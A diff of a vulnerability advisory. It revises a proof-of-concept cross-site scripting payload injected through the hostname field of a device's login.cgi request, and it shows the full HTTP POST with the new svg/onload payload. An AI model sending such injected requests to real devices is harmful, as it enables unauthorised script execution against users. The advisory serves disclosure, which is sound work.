@@ -31,12 +31,12 @@ However，the sub_401F80 function creates a response packet and places the unfil
 
 ## Proof of Concept (PoC)
 
-We set `hostname` as **192.168.6.2"><svg/onload=alert()><div** ,such as:
+We set `hostname` as **192.168.6.2"</script><svg/onload=alert()>** ,such as:
 
 ```http
 POST /cgi-bin/login.cgi HTTP/1.1
 Host: 192.168.6.2
-Content-Length: 289
+Content-Length: 294
 Cache-Control: max-age=0
 Accept-Language: en-US,en;q=0.9
 Origin: http://192.168.6.2
@@ -48,11 +48,12 @@ Referer: http://192.168.6.2/
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
-newUI=1&page=login&username=admin&langChange=0&ipaddr=%3A%3Affff%3A192.168.6.1&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&wizardpage=wizard.shtml&hostname=192.168.6.2"><svg/onload=alert()><div&key=M71434598&password=892cfea5f25ca640a279e0255be7cdbf&lang_select=en
+newUI=1&page=login&username=admin&langChange=0&ipaddr=%3A%3Affff%3A192.168.6.1&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&wizardpage=wizard.shtml&hostname=192.168.6.2"</script><svg/onload=alert()>&key=M55759906&password=9e9fcf8c5bceb1f0960736c6641cbe8a&lang_select=en
 ```
 
 ## outcome
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
 
 
